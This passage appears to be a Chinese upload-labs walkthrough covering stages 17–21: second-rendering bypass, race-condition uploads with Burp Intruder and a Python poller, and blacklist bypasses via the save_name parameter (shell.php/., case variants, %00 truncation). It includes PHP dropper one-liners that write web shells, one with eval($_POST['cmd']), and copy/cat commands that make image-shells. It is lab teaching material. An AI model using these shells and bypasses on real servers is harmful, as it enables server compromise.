                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "png") && ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = "该文件不是png格式的图片！";
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".png";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagepng($im,$img_path);

                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "gif") && ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = "该文件不是gif格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".gif";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagegif($im,$img_path);

                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }
    }else{
        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
    }
}

```

这一关是典型的**二次渲染**（re-rendering）防护，难度明显上升。

核心逻辑：

1. 先检查后缀 + MIME 类型（必须是 jpg/png/gif）。
2. 使用 GD 库函数把图片重新创建并保存：
   * imagecreatefromjpeg() / imagecreatefrompng() / imagecreatefromgif()
   * 再调用 imagejpeg() / imagepng() / imagegif() 生成新图
3. **删除原始上传文件**，只保留重新渲染后的图片。

二次渲染会把大部分追加在图片后面的 PHP 代码直接丢掉，所以普通的“图片 + 一句话”基本无效。

**步骤：**

上传包含一句话木马的 GIF 图片。

```plain
# Windows
copy /b normal.gif + shell.php shell.gif

# Linux / macOS
cat normal.gif shell.php > shell.gif
```

![1787568833198-2444cb0d-274c-476c-b459-68e74625b281.png](./img/282317868/1787568833198-2444cb0d-274c-476c-b459-68e74625b281-059525.png)

上传 GIF 图片马。

![1787568884468-b9d31d91-59bb-4d96-8f73-3b0fb8d694f9.png](./img/282317868/1787568884468-b9d31d91-59bb-4d96-8f73-3b0fb8d694f9-742374.png)

去访问图片马会发现 php 无法解析。\
![1787568935996-29c0664d-6b8b-48f4-bb8c-d5a8361f5ac3.png](./img/282317868/1787568935996-29c0664d-6b8b-48f4-bb8c-d5a8361f5ac3-990563.png)

下载下来这个上传的图片马。

![1787569001453-b8072941-8820-4f46-814d-ec319c2f6724.png](./img/282317868/1787569001453-b8072941-8820-4f46-814d-ec319c2f6724-984823.png)

通过 010Editor 工具打开我们制作的图片马 phpinfo.gif，并点击比较文件按钮，

![1787569217255-7436f229-ca38-4d54-8d0a-01e7fc0d330b.png](./img/282317868/1787569217255-7436f229-ca38-4d54-8d0a-01e7fc0d330b-996754.png)

上面的是原始的图片马，下面的是上传过后下载下来的图片马，可以看懂下载下来的图片马已经发现了变化了。

红色的部分是修改过的，白色的部分是为被修改过的。所以我们只能在白色的部分来添加上我们的一句话木马。

![1787569480762-e057c745-a7e5-4fe3-8cfc-53352a53ba8d.png](./img/282317868/1787569480762-e057c745-a7e5-4fe3-8cfc-53352a53ba8d-721923.png)

一句话木马我就插在白色匹配的部分里面。

![1787570085293-b842968b-6e83-425d-973e-af619c57117a.png](./img/282317868/1787570085293-b842968b-6e83-425d-973e-af619c57117a-626494.png)

重新上传测试一下。

![1787638383966-97d24ff7-380a-4694-8f47-1142f4774ea5.png](./img/282317868/1787638383966-97d24ff7-380a-4694-8f47-1142f4774ea5-861586.png)

访问图片网址，可以看到已经成功解析 phpinfo 页面了。

![1787638432523-feec8cc6-44f3-4cc0-8b0b-22e3f4edb74c.png](./img/282317868/1787638432523-feec8cc6-44f3-4cc0-8b0b-22e3f4edb74c-472755.png)

![1787639498542-6b970474-b783-4394-abe0-61e9259d6616.png](./img/282317868/1787639498542-6b970474-b783-4394-abe0-61e9259d6616-485615.png)

***

### Pass-18：条件竞争（一）

**考点：**

业务顺序类似：**先写入 → 再检查 → 不合法则删除**。在“已写入、未删除”的窗口内请求该文件，可能抢到执行机会。

**代码逻辑（典型）：**

```javascript
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
  $ext_arr = array('jpg','png','gif');
  $file_name = $_FILES['upload_file']['name'];
  $temp_file = $_FILES['upload_file']['tmp_name'];
  $file_ext = substr($file_name,strrpos($file_name,".")+1);
  $upload_file = UPLOAD_PATH . '/' . $file_name;

  if(move_uploaded_file($temp_file, $upload_file)){
    if(in_array($file_ext,$ext_arr)){
      $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
      rename($upload_file, $img_path);
      $is_upload = true;
    }else{
      $msg = "只允许上传.jpg|.png|.gif类型文件！";
      unlink($upload_file);
    }
  }else{
    $msg = '上传出错！';
  }
}
```

这一关的核心漏洞是**条件竞争（Race Condition）**。

关键代码执行顺序：

```plain
// 1. 先把文件移动到上传目录（使用原始文件名）
if(move_uploaded_file($temp_file, $upload_file)){

    // 2. 然后再检查后缀
    if(in_array($file_ext,$ext_arr)){
        // 合法 → 重命名
        rename(...);
    }else{
        // 非法 → 删除
        unlink($upload_file);
    }
}
```

也就是说：**先保存，后检查**。\
如果上传一个 .php 文件，在它被 unlink() 删除之前，文件已经存在于服务器上，存在一个极短的时间窗口可以访问。

**绕过思路**

1. 使用脚本**高并发上传**同一 webshell（如 .php）
2. 另一侧**高并发请求**已预测或回显的 URL
3. 在 unlink 前命中一次即可

**伪代码概念：**

```plain
线程 A: 循环 POST 上传 shell.php
线程 B: 循环 GET /upload/shell.php
```

**步骤：**

准备 phpinfo.php 文件

```php
<?php fputs(fopen('webshell.php','w'),'<?php phpinfo();?>');?>
```

![1787652678862-c6f51ea8-aa3c-41fd-99f4-99ec460598a4.png](./img/282317868/1787652678862-c6f51ea8-aa3c-41fd-99f4-99ec460598a4-599108.png)

| 代码部分 | 作用 |
| --- | --- |
| `fopen('webshell.php','w')` | 以**写入模式**打开（如果不存在则创建）一个名为 `webshell.php`<br/> 的文件 |
| `fputs(..., '<?php phpinfo();?>')` | 把字符串 `<?php phpinfo();?>`<br/> 写入到刚才打开的文件中 |
| 整体效果 | 当这段代码被执行时，会在**当前目录**下生成一个新的 `webshell.php`<br/> 文件，内容是 `<?php phpinfo();?>` |

简单说：这是一个“生成器”或“投放器”，它自己被执行一次后，会在服务器上留下一个新的 PHP 文件。

**利用思路：**

1. 把上面这段代码保存为例如 phpinfo.php（或根据该关要求做图片马等处理）后上传。
2. 在文件还没被删除的极短时间内，**高频访问**刚上传的文件。
3. 一旦成功执行到这段代码，它就会在服务器上写出一个新的 webshell.php。
4. 即使原来的上传文件被删除了，新生成的 webshell.php 仍然保留下来。
5. 之后直接访问 webshell.php 即可。

这就是为什么第18关经常使用这种“自己写文件”的代码，而不是直接上传普通一句话木马。

上传 phpinfo.php 文件，通过 BurpSuite 抓包。

![1787707852664-46a6b7c8-812c-4af2-8b02-6bed2505149a.png](./img/282317868/1787707852664-46a6b7c8-812c-4af2-8b02-6bed2505149a-538978.png)

发送到 Intruder 测试器。并且攻击类型选择 Sniper（狙击手），点击右侧的 Clear（清除）。

![1787707395212-9344b321-b064-4ac8-a186-a4a69c4d8c60.png](./img/282317868/1787707395212-9344b321-b064-4ac8-a186-a4a69c4d8c60-200554.png)

在有效载荷这里，选择有效载荷类型为 Null payloads（没有负载）。在下面的有效载荷选项选择 Contlnue Indefinitely（无限期地重复）。

![1787653013907-11544150-8e3f-4979-9b84-ced0a8ba5fbd.png](./img/282317868/1787653013907-11544150-8e3f-4979-9b84-ced0a8ba5fbd-310827.png)

在选项这里建议把线程数调整为 50。

![1787707346897-2e10e2a0-4ea6-41b4-921b-be43b14ba889.png](./img/282317868/1787707346897-2e10e2a0-4ea6-41b4-921b-be43b14ba889-063112.png)

放掉之前抓的包。开始抓第二个包，抓取我们上传上去的 PHP 文件。

```plain
http://192.168.3.3/upload-labs/upload/phpinfo.php
```

![1787653587026-47f807bb-47de-4b75-85ec-f95537ea49ab.png](./img/282317868/1787653587026-47f807bb-47de-4b75-85ec-f95537ea49ab-910122.png)

然后发送到 Intruder 测试器，攻击类型选择 Sniper（狙击手）。

![1787653647487-9a57dea6-8150-41e9-bb47-53db2c349242.png](./img/282317868/1787653647487-9a57dea6-8150-41e9-bb47-53db2c349242-207978.png)

在有效载荷这里，选择有效载荷类型为 Null payloads（没有负载）。在下面的有效载荷选项选择 Contlnue Indefinitely（无限期地重复）。

![1787653682590-faec6485-cdc6-43be-8635-1abaee931b47.png](./img/282317868/1787653682590-faec6485-cdc6-43be-8635-1abaee931b47-101366.png)

在选项这里建议把线程数调整为 80。比 POST 快就行。

![1787707951287-e3da0cd0-a684-4894-8d5d-22508ed8561b.png](./img/282317868/1787707951287-e3da0cd0-a684-4894-8d5d-22508ed8561b-594446.png)

开始爆破两个包。先开始攻击 POST 包，再攻击 GET 包。在这个过程中要耐心等待，会出现一定几率的突然的卡顿，然后又重新恢复的状态，就说明可能上传成功了。

![1787653813816-6e009c19-eeaf-4ffc-b145-ac2b9afd8ec8.png](./img/282317868/1787653813816-6e009c19-eeaf-4ffc-b145-ac2b9afd8ec8-332544.png)

![1787653826666-1386f469-db30-403a-9a04-f7b99ca6b2c8.png](./img/282317868/1787653826666-1386f469-db30-403a-9a04-f7b99ca6b2c8-235163.png)

在 Get 包里面点击响应，查看状态 ，有可能会出现这种包虽然也是 200 的状态码，但是还没有成功。

![1787708130418-d75c47a0-2635-4035-b477-832885ea52a3.png](./img/282317868/1787708130418-d75c47a0-2635-4035-b477-832885ea52a3-007856.png)

![1787708186719-8ed5bce5-ae5c-4fd2-8779-d44c70698709.png](./img/282317868/1787708186719-8ed5bce5-ae5c-4fd2-8779-d44c70698709-290416.png)

再次查看状态，如果出现空白的 200 就说明上传成功了。后面就可以停止攻击了。

![1787708219836-b7f2377a-122a-486e-8546-0695a4da0da0.png](./img/282317868/1787708219836-b7f2377a-122a-486e-8546-0695a4da0da0-340343.png)

访问我们上传成功的包，可以看到 phpinfo 成功解析。注意，访问的是 webshell.php。因为在上面的代码里面phpinfo.php 文件在删除前会被执行一次，生成一个 webshell.php。所以要访问的是 webshell.php。

```plain
http://192.168.3.3/upload-labs/upload/webshell.php
```

![1787708327962-6cf4ab90-de52-40a6-8f8d-9ba7d65acda7.png](./img/282317868/1787708327962-6cf4ab90-de52-40a6-8f8d-9ba7d65acda7-504459.png)

![1787708875982-95742538-7563-4add-8544-dd13e70e2d31.png](./img/282317868/1787708875982-95742538-7563-4add-8544-dd13e70e2d31-847684.png)

当然也可以使用 <font style="color:rgb(37, 41, 51);">python脚本，通过它来不停的访问我们上传上去的PHP文件。</font>

<font style="color:rgb(37, 41, 51);">抓取上传的 POST 包并发送到 Intruder（测试器），并设置好线程等。</font>

![1787707395212-9344b321-b064-4ac8-a186-a4a69c4d8c60.png](./img/282317868/1787707395212-9344b321-b064-4ac8-a186-a4a69c4d8c60-200554.png)

![1787653013907-11544150-8e3f-4979-9b84-ced0a8ba5fbd.png](./img/282317868/1787653013907-11544150-8e3f-4979-9b84-ced0a8ba5fbd-310827.png)

注意，这里线程数设置为 20 的话比较合适。刚好不好太高太低。

![1787710323198-70c7be47-d71c-410f-a790-164969079d27.png](./img/282317868/1787710323198-70c7be47-d71c-410f-a790-164969079d27-159478.png)

编写 python 脚本

```python
import requests
def main():
    #注意：这里的 url 里面的参数替换为你对应的上传文件访问路径，每个人的文件命名可能不同。
    url='http://192.168.3.3/upload-labs/upload/phpinfo.php'
    while True:
        res = requests.get(url)
        print('未找到php文件')
        if res.status_code == 200:
            print('over!')
            break

if __name__ == '__main__':
    main()
```

开始爆破 POST 包。

![1787653813816-6e009c19-eeaf-4ffc-b145-ac2b9afd8ec8.png](./img/282317868/1787653813816-6e009c19-eeaf-4ffc-b145-ac2b9afd8ec8-583478.webp)

同时运行 python 脚本。

```python
Windows:
python test.py

Linux:
python3 test.py
```

![1787709969397-4d0e629b-8163-4f48-aafb-7162a7f29600.png](./img/282317868/1787709969397-4d0e629b-8163-4f48-aafb-7162a7f29600-928736.png)

这期间要不断的运行这个 python 脚本，直到出现一次卡顿假死，那说明可能上传成功了，如果还是没有访问到，就再运行 python 脚本，多试几次。在 upload 这个路径里面会多出来一个 webshell.php 文件，就说明上传成功了。

![1787710412254-69cf6a0e-ddfd-44a0-aac3-0104d7489f88.png](./img/282317868/1787710412254-69cf6a0e-ddfd-44a0-aac3-0104d7489f88-261798.png)

之后去访问就可以了。

![1787710398585-e6c5850a-6bf1-4605-949a-841324049d26.png](./img/282317868/1787710398585-e6c5850a-6bf1-4605-949a-841324049d26-632018.png)

***

### Pass-19：条件竞争（二） + Apache 解析漏洞

Pass-19 常与 **Apache 解析漏洞**（如 `shell.php.jpg` 在错误配置下按 PHP 解析）结合，且官方说明更偏 Linux。

前提：第十九关的上传路径有点问题，不是上传到了upload里面，建议修改一下，进入第十九关，找到myupload.php文件，如图所示修改。

![1787713545231-a2202b19-3fd5-4ac1-b08a-cc8eb1d8d2e6.png](./img/282317868/1787713545231-a2202b19-3fd5-4ac1-b08a-cc8eb1d8d2e6-889365.png)

![1787713576127-e66bc84a-2fcf-4fc4-a9c0-73e292f59813.png](./img/282317868/1787713576127-e66bc84a-2fcf-4fc4-a9c0-73e292f59813-507936.png)

重启就可以了。

**考点**

官方说明中，部分关卡更适合 **Linux**。常见组合：

* 条件竞争（先存后删/后改）
* 或 Apache 解析问题（如错误配置下 file.php.xxx 按 PHP 解析）

**代码逻辑（典型）：**

```python
//index.php
$is_upload = false;
$msg = null;
if (isset($_POST['submit']))
{
    require_once("./myupload.php");
    $imgFileName =time();
    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
    $status_code = $u->upload(UPLOAD_PATH);
    switch ($status_code) {
        case 1:
            $is_upload = true;
            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
            break;
        case 2:
            $msg = '文件已经被上传，但没有重命名。';
            break; 
        case -1:
            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
            break; 
        case -2:
            $msg = '上传失败，上传目录不可写。';
            break; 
        case -3:
            $msg = '上传失败，无法上传该类型文件。';
            break; 
        case -4:
            $msg = '上传失败，上传的文件过大。';
            break; 
        case -5:
            $msg = '上传失败，服务器已经存在相同名称文件。';
            break; 
        case -6:
            $msg = '文件无法上传，文件不能复制到目标目录。';
            break;      
        default:
            $msg = '未知错误！';
            break;
    }
}

//myupload.php
class MyUpload{
......
......
...... 
  var $cls_arr_ext_accepted = array(
      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",
      ".html", ".xml", ".tiff", ".jpeg", ".png" );

......
......
......  
  /** upload()
   **
   ** Method to upload the file.
   ** This is the only method to call outside the class.
   ** @para String name of directory we upload to
   ** @returns void
  **/
  function upload( $dir ){
    
    $ret = $this->isUploadedFile();
    
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->setDir( $dir );
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkExtension();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkSize();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }
    
    // if flag to check if the file exists is set to 1
    
    if( $this->cls_file_exists == 1 ){
      
      $ret = $this->checkFileExists();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }

    // if we are here, we are ready to move the file to destination

    $ret = $this->move();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }

    // check if we need to rename the file

    if( $this->cls_rename_file == 1 ){
      $ret = $this->renameFile();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }
    
    // if we are here, everything worked as planned :)

    return $this->resultUpload( "SUCCESS" );
  
  }
......
......
...... 
};
```

这一关使用了自定义的 MyUpload 类来处理上传，核心是**后缀白名单**。

**白名单内容**

```plain
$cls_arr_ext_accepted = array(
    ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z", ".ppt",
    ".html", ".xml", ".tiff", ".jpeg", ".png"
);
```

PHP 相关后缀都不在白名单中，直接上传 .php 会被拒绝（返回状态码 -3）。

**典型思路**

1. 与 Pass-18 类似的并发上传 + 访问
2. 若存在解析漏洞配置，尝试 shell.php.jpg 等形式（**仅当服务器存在错误解析规则时**）
3. 以本关源码与中间件配置为准，不要假设所有环境都能解析双后缀

步骤\
php 一句话木马

```python
<?php fputs(fopen('webshell.php','w'),'<?php phpinfo();?>');?>
```

![1787730774844-48a71f15-0d36-4465-82ba-36fc6156ba37.png](./img/282317868/1787730774844-48a71f15-0d36-4465-82ba-36fc6156ba37-618087.png)

上传 phpinfo.php 文件，抓包。

![1787730912796-15a1ca06-3fca-454a-9f6d-d241a46e79fd.png](./img/282317868/1787730912796-15a1ca06-3fca-454a-9f6d-d241a46e79fd-465296.png)

发送到 Intruder（测试器）去。添加“.7z”，攻击类型选 Sniper（狙击手），点击右侧的 Clear（ 清楚）。

![1787731116788-c565f834-0ca6-46a6-ab5a-a0ad82aea62e.png](./img/282317868/1787731116788-c565f834-0ca6-46a6-ab5a-a0ad82aea62e-575222.png)

在有效载荷这里，选择有效载荷类型为 Null payloads（没有负载）。在下面的有效载荷选项选择 Contlnue Indefinitely（无限期地重复）。

![1787731132891-d3b770f3-1f81-472c-866e-03b941da8c27.png](./img/282317868/1787731132891-d3b770f3-1f81-472c-866e-03b941da8c27-039937.png)

在选项栏这边，设置线程数为 20。

![1787731169840-1bae9804-873a-494a-9b0e-53b63b1a78d4.png](./img/282317868/1787731169840-1bae9804-873a-494a-9b0e-53b63b1a78d4-171611.png)

之后我们抓取第二个包，GET 包，就是访问我们上传的文件的包，即 phpinfo.php.7z 文件。

```python
http://192.168.3.3/upload-labs/upload/phpinfo.php.7z
```

![1787731568116-f2bef201-42ef-4ff8-90f1-05208d2a5192.png](./img/282317868/1787731568116-f2bef201-42ef-4ff8-90f1-05208d2a5192-074295.png)

发送到 Intruder（测试器），设置攻击类型为 Sniper（狙击手）。

![1787731604181-ab424ccf-247e-469d-89f6-475e7fa1a206.png](./img/282317868/1787731604181-ab424ccf-247e-469d-89f6-475e7fa1a206-227419.png)

在有效载荷这里，选择有效载荷类型为 Null payloads（没有负载）。在下面的有效载荷选项选择 Contlnue Indefinitely（无限期地重复）。

![1787653013907-11544150-8e3f-4979-9b84-ced0a8ba5fbd.png](./img/282317868/1787653013907-11544150-8e3f-4979-9b84-ced0a8ba5fbd-310827.png)

线程数设置为 30。

![1787731695930-b3afdfe4-cedd-4fb6-8c14-1ff3cad12cdd.png](./img/282317868/1787731695930-b3afdfe4-cedd-4fb6-8c14-1ff3cad12cdd-758325.png)

同时开始攻击两个包，先攻击 POST 包，再攻击 GET 包。攻击不需要很久，我测试的时候一点就可以生成了。

![1787731747099-5d77868c-aebc-4092-aa06-d190685deac7.png](./img/282317868/1787731747099-5d77868c-aebc-4092-aa06-d190685deac7-924450.png)

![1787731752922-8a4de92f-18c5-477c-9264-aac86f87affc.png](./img/282317868/1787731752922-8a4de92f-18c5-477c-9264-aac86f87affc-324049.png)

在这里目录下可以看到已经生成我们的 webshell.php 文件了。

![1787731941400-6bcbb0c6-87d6-4209-821e-18a72a393674.png](./img/282317868/1787731941400-6bcbb0c6-87d6-4209-821e-18a72a393674-154045.png)

去访问这个文件就可以看到 php 成功解析了。

```python
http://192.168.3.3/upload-labs/upload/webshell.php
```

![1787732007809-eeab2c65-9636-473a-bedf-594ee5eccc01.png](./img/282317868/1787732007809-eeab2c65-9636-473a-bedf-594ee5eccc01-546712.png)

![1787734119304-654ab0a7-7d96-431b-84a3-bd98cbe0474f.png](./img/282317868/1787734119304-654ab0a7-7d96-431b-84a3-bd98cbe0474f-679589.png)

第二种方式是通关上传图片马的方式。

写上一句话木马

```python
<?php fputs(fopen('upload/shell.php','w'),'<?php phpinfo();?>');?>
```

```python
<?php fputs(fopen('upload/shell.php','w'),'<?php @eval($_POST["cmd"]);?>');?>
```

![1787745676554-08346868-8e32-49f9-b20f-af11049b5982.png](./img/282317868/1787745676554-08346868-8e32-49f9-b20f-af11049b5982-425498.png)

制作图片马

```python
copy /b 正常图片.jpg + 2.php  webshell.jpg
```

![1787745737065-af987e82-e4b6-4705-8c20-078a481470fa.png](./img/282317868/1787745737065-af987e82-e4b6-4705-8c20-078a481470fa-315034.png)

上传图片马，并抓包。

![1787746521412-908b8404-de71-47a0-ab77-edfd7f127448.png](./img/282317868/1787746521412-908b8404-de71-47a0-ab77-edfd7f127448-576103.png)

发送到 Intruder，攻击类型选择 Sniper（狙击手），点击右边的 Clear（清除）一下。

![1787746599279-280427d7-230d-4257-9ad2-4248b6185029.png](./img/282317868/1787746599279-280427d7-230d-4257-9ad2-4248b6185029-360966.png)

在有效载荷这里，选择有效载荷类型为 Null payloads（没有负载）。在下面的有效载荷选项选择 Contlnue Indefinitely（无限期地重复）。

![1787746629764-a6303194-3432-43c1-a90e-5839b6d7eca7.png](./img/282317868/1787746629764-a6303194-3432-43c1-a90e-5839b6d7eca7-442986.png)

线程数设置为 20。

![1787746676047-bb633ad4-c381-4096-9c91-01cde6896d6d.png](./img/282317868/1787746676047-bb633ad4-c381-4096-9c91-01cde6896d6d-986432.png)

抓第二个包，访问这个路径，目的就是在上传文件的一瞬间去访问这个图片马，才能执行后面的 php 解析。

```python
http://192.168.3.3/upload-labs/include.php?file=upload/phpinfo.jpg
```

发送到 Intruder，并点击右侧的 Clear（清除），攻击类型选择 Sniper（狙击手）。

![1787746896371-0722423d-b255-4156-9104-c9cff8e7acd2.png](./img/282317868/1787746896371-0722423d-b255-4156-9104-c9cff8e7acd2-722902.png)

在有效载荷这里，选择有效载荷类型为 Null payloads（没有负载）。在下面的有效载荷选项选择 Contlnue Indefinitely（无限期地重复）。

![1787746629764-a6303194-3432-43c1-a90e-5839b6d7eca7.png](./img/282317868/1787746629764-a6303194-3432-43c1-a90e-5839b6d7eca7-442986.png)

线程数设置为 30，比上面第一包的线程数大点就可以。

![1787746971843-4815483a-b3d0-466f-86e7-7f6a6bf8ff42.png](./img/282317868/1787746971843-4815483a-b3d0-466f-86e7-7f6a6bf8ff42-151688.png)

同时开始进行攻击。先攻击 POST，即第一个包，再攻击 GET 包，即第二个包。

![1787747121191-e13f907b-62d6-4005-95d7-f10741b805ef.png](./img/282317868/1787747121191-e13f907b-62d6-4005-95d7-f10741b805ef-481470.png)

![1787747130789-d3179a06-eb36-43bf-a029-9b4dca0e9a50.png](./img/282317868/1787747130789-d3179a06-eb36-43bf-a029-9b4dca0e9a50-406491.png)

攻击开始后等待 5~8 秒钟，然后都暂停攻击，测试是否已经上传成功。我这边攻击很快就看到已经上传成功了。

如果还没有上传的话，就继续开着，多开久一点。

从这里可以看到上传并访问了 phpinfo.jpg 文件后，会生成一个 shell.php，出现这个就说明成功了。

![1787747289379-975ff634-a2bd-48c2-a76c-f6231244ed8c.png](./img/282317868/1787747289379-975ff634-a2bd-48c2-a76c-f6231244ed8c-806900.png)

访问这个 shell.php 文件，即可看到 php 文件已经成功解析了。

![1787747535128-616f6469-ce62-47ce-9265-f1a52f160116.png](./img/282317868/1787747535128-616f6469-ce62-47ce-9265-f1a52f160116-443345.png)

![1787747471535-4ef009b9-1b78-4f88-8a1f-63a94a1d7cbb.png](./img/282317868/1787747471535-4ef009b9-1b78-4f88-8a1f-63a94a1d7cbb-078955.png)

***

### Pass-20：后缀绕过

**考点**

多条件叠加，例如：

* 扩展名白名单或黑名单
* 文件名/路径做了简单替换或拼接
* 对 ./、多余后缀、规范化处理不一致

**分析步骤（建议固定流程）**

1. 列出所有校验：后缀、MIME、内容、路径
2. 看最终路径如何拼接：$path . $name
3. 看是否有 str_replace、去空格、去点等**只处理一次**的逻辑
4. 构造使「校验时合法、落盘或解析时变成脚本」的名字

**代码逻辑（典型）：**

```python
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = $_POST['save_name'];
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        if(!in_array($file_ext,$deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) { 
                $is_upload = true;
            }else{
                $msg = '上传出错！';
            }
        }else{
            $msg = '禁止保存为该类型文件！';
        }

    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

这一关的核心点是：

```plain
$file_name = $_POST['save_name'];          // 文件名完全由用户控制
$file_ext  = pathinfo($file_name, PATHINFO_EXTENSION);

if(!in_array($file_ext, $deny_ext)) {
    // 保存为用户指定的名字
}
```

黑名单是**小写**的，并且**没有使用 strtolower()**。

这一关的核心代码是：

* 文件名由 $\_POST\['save_name'] 完全控制
* 使用 pathinfo($file_name, PATHINFO_EXTENSION) 提取后缀
* 黑名单验证（且没有转小写）
* 最后用 move_uploaded_file() 保存

**原理**：

1. 把 save_name 设置为 shell.php/.
2. pathinfo(..., PATHINFO_EXTENSION) 会提取到**空后缀**（最后一个点后面什么都没有）
3. 空后缀不在黑名单里，检查通过
4. move_uploaded_file() 函数会忽略文件名末尾的 /.，最终文件被保存为 shell.php

**步骤：**

1. 准备好你的 webshell（内容为 PHP 代码）。

```python
<?php phpinfo(); ?>
```

![1787749135643-28a8cf50-e4e4-45e5-af7b-1a13b6aa760c.png](./img/282317868/1787749135643-28a8cf50-e4e4-45e5-af7b-1a13b6aa760c-526335.png)

2. 使用 Burp 抓包上传。

![1787749195270-dbcbf2ac-e7a8-4769-832b-3a9c36c9e55c.png](./img/282317868/1787749195270-dbcbf2ac-e7a8-4769-832b-3a9c36c9e55c-719777.png)

3. 找到 POST 参数里的 save_name，把它的值修改为：

```plain
save_name=shell.php/.
```

![1787749424648-0f397e70-c9b5-441b-a485-a355b467e358.png](./img/282317868/1787749424648-0f397e70-c9b5-441b-a485-a355b467e358-802618.png)

![1787749347652-8edd9e67-85ab-4f24-882e-977c923c0d5a.png](./img/282317868/1787749347652-8edd9e67-85ab-4f24-882e-977c923c0d5a-216517.png)

4. 放行请求。

上传成功后，文件实际保存为 shell.php，直接访问即可。

![1787749458692-8b36d313-c859-4675-9216-bd986d9b02db.png](./img/282317868/1787749458692-8b36d313-c859-4675-9216-bd986d9b02db-657352.png)

![1787749550583-c8c79409-683f-4529-987f-847c123640b5.png](./img/282317868/1787749550583-c8c79409-683f-4529-987f-847c123640b5-755924.png)

**其他绕过的方法：**

**大小写绕过（最简单）**

黑名单全是小写，直接换大小写即可。

```plain
save_name=shell.PHP
save_name=shell.pHp
save_name=shell.Php
save_name=shell.pHP
```

**末尾点绕过**

```plain
save_name=shell.php.
```

Windows 下保存时会自动去掉最后的点，变成 shell.php。

**空格绕过**

```plain
save_name=shell.php
```

（php 后面加一个空格）\
或

```plain
save_name=shell.php .
```

**%00 截断**

本关考察 CVE-2015-2348 move_uploaded_file() 00 截断,上传 webshell,同时自定义保存名称,直接保存为 php 是不行的，move_uploaded_file()函数中的img_path是由post参数save_name控制的，可以在save_name利用%00截断（注意 php 版本低于5.3.4 才可以生效）

上传图片马，抓包，在 save_name 后面修改名称，我这里修改为 phpinfo.php.jpg。

![1787793820846-8c737efe-2e0c-4152-9d9f-84fc79b91c03.png](./img/282317868/1787793820846-8c737efe-2e0c-4152-9d9f-84fc79b91c03-923966.png)

![1787793821661-91fd3dbd-16a0-4056-a310-7512ea20a971.png](./img/282317868/1787793821661-91fd3dbd-16a0-4056-a310-7512ea20a971-482892.png)

对着%00 选中，右键，选择 URL 网址解码。

![1787793822381-919d19d2-0a97-415e-b89e-6bb677fc390c.png](./img/282317868/1787793822381-919d19d2-0a97-415e-b89e-6bb677fc390c-751185.png)

解码之后这边会出现一个空白框。之后放行包。

![1787793826604-88e2351f-81f5-4ce0-95d9-3aa01de3abd9.png](./img/282317868/1787793826604-88e2351f-81f5-4ce0-95d9-3aa01de3abd9-441556.png)

![1787793892570-8e0a3251-2fa6-4aa1-a36b-4c858fac89ac.png](./img/282317868/1787793892570-8e0a3251-2fa6-4aa1-a36b-4c858fac89ac-349654.png)

之后就复制这个图片的链接去访问就可以了，记得把后面的.jpg 去掉。可以看到成功解析了 php 页面。

![1787793950980-6cef3840-73ce-445c-b5a3-6ed3f9ff660a.png](./img/282317868/1787793950980-6cef3840-73ce-445c-b5a3-6ed3f9ff660a-534488.png)

![1787793973461-ccf16018-110c-4264-9741-ab463a3126d5.png](./img/282317868/1787793973461-ccf16018-110c-4264-9741-ab463a3126d5-938710.png)

***

### Pass-21：数组绕过

**考点**

通常为前几关手法的再组合，例如：

* 白名单后缀
* 路径或文件名参数可控但多了一层校验
* 对 ../、./、空字节等做了部分防护但仍有缺口

**代码逻辑（典型）：**

```python
$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
